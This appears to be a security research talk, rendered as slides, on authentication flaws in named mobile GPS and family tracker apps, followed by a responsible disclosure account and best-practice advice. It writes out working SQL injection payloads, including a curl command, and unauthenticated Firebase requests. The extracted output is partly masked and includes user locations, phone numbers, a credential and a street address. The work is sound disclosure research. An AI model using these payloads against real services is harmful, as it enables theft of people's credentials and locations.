# Authentication and Security Vulnerabilities in Mobile Applications

## Part 2: Who Needs Authentication?

### What happens if `user_id` is empty?
- **Attacker**: Can exploit the back-end to track all users.
- **Tracker Back-end**: Exposes all messages of all users.

### SQL Injection Examples
#### Simple SQL Injection
- **Example 1**:
  ```http
  http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='
  ```
  - **Back-end API Extraction**:
    ```json
    [
      {"to_username":"*****","to_mobile":"9********9","lat":"*0.2916455","lon":"7*.0521764","time":"12:0,27-12-2016"},
      {"to_username":"***","to_mobile":"9********4","lat":"2*.644490000000005","lon":"*8.35368","time":"18:55,04-12-2016"},
      ...
    ]
    ```

- **Example 2**:
  ```http
  http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='
  ```
  - **Back-end API Extraction**:
    ```json
    [
      {"to_username":"****","to_mobile":"9********2","lat":"*3.8710253","lon":"*5.6093338","time":"18:6,19-11-2016"},
      {"to_username":"****","to_mobile":"9*******2","lat":"*6.5958902","lon":"-*7.3897167","time":"13:46,04-12-2016"},
      ...
    ]
    ```

### Accessing Images
- **Cloud Storage for Images**:
  - One cloud for all images.
  - User authentication required.
  - Filter corresponding images by user ID.
  - Bypass cloud authentication to get access to all images.

### Getting All User Credentials
- **App Process**:
  1. App checks if the user already has an account.
  2. Sends device ID to the server.
     ```http
     POST http://push001.***********/***********/v5/
     Content-Type: application/json
     {"method":"getuserid","deviceid":"c1b86d87ed6f51011c0d53a654f16455"}
     ```
  3. Server checks if the ID exists and responds with:
     - Username
     - Password
     - Email

### Attack Strategy
- **Spoofing Device ID**:
  - Device ID generation is relatively complex, making guessing unlikely.
  - Empty ID trick does not work.
    ```http
    POST http://push001.***********/***********/v5/
    Content-Type: application/json
    {"method":"getuserid","deviceid":" "}
    ```
  - SQL Injection:
    ```http
    POST http://push001.***********/***********/v5/
    Content-Type: application/json
    {"method":"getuserid","deviceid":" ' or 1=1   limit 1 offset 5 -- "}
    ```
  - **Curl Command**:
    ```bash
    curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\",\"deviceid\":\" ' or 1=1   limit 1 offset 5 --\"}" http://push001.***********/*********/v5/
    ```
  - **Result**:
    ```json
    {"result":"success","id":"yb*****","pass":"y********4","email":"y*****@hanmail.net"}
    ```

### Firebase Authentication Misconfiguration
- **Attack Example**:
  - **Request**:
    ```http
    POST /*******celltracker/api/login HTTP/1.1
    {"user_email":"PI:EMAIL"}
    ```
  - **Response**:
    ```json
    {"login_data":[{"user_id":"149737514214639",...}]
    ```
  - **User Data**:
    - `user_email`: PI:EMAIL
    - `user_id`: 149737514214639
    - `user_id`: 145859345853234
    - ...

- **Location Without Authorization**:
  - **Request**:
    ```http
    https://*****************.firebaseio.com/Users/149737514214639
    ```
  - **Response**:
    ```json
    {
      "last_location": {
        "address": "Rheinstraße 75 64295 Darmstadt Germany",
        "date": "13/06/2017",
        "lat": 49.8717048,
        "long": 8.6387116
      }
    }
    ```

### Summary
- **Security Best Practices**:
  - Do not use plaintext communication in mobile apps.
  - Use prepared statements to avoid SQL injection.
  - Consider both app and back-end security.
  - Do not store any user secrets in the app (client side).
  - Use Google's API for payment and license verification.
  - Implement proper authentication and authorization for back-end data (e.g., Firebase).

### Responsible Disclosure
- **Process**:
  - Informed vendors, 90 days to fix the bugs.
  - Reactions varied from "We will fix it" to no reaction, and some even asked for money.
  - Some apps were removed from the Google Play Store, but some remain vulnerable.
  - Some apps are now detected as malware.

### Client-Side Vulnerability
- **Apps with Vulnerabilities**:
  - My Family GPS Tracker
  - KidControll GPS Tracker
  - Family Locator (GPS)
  - Free Cell Tracker
  - Rastreador de Novia 1
  - Rastreador de Novia 2
  - Phone Tracker Free
  - Phone Tracker Pro
  - Rastrear Celular Por el Numero
  - Localizador de Celular GPS
  - Rastreador de Celular Avanzado
  - Handy Orten per Handynr
  - Localiser un Portable avec son Numero
  - Phone Tracker By Number
  - Track My Family
  - Couple Vow
  - Real Time GPS Tracker
  - Couple Tracker App
  - Ilocatemobile

### Thanks to…
- Alex, Daniel, Julien, Julius, Michael, Philipp, Steven, Kevin, Sebald
- Stephan Huber (Email: PI:EMAIL, Findings: http://sit4.me/tracker-apps)
- Siegfried Rasthofer (Email: PI:EMAIL, Web: www.rasthofer.info, Twitter: @teamsik, Web: www.team-sik.org)

For more information, visit: [http://sit4.me/tracker-apps](http://sit4.me/tracker-apps)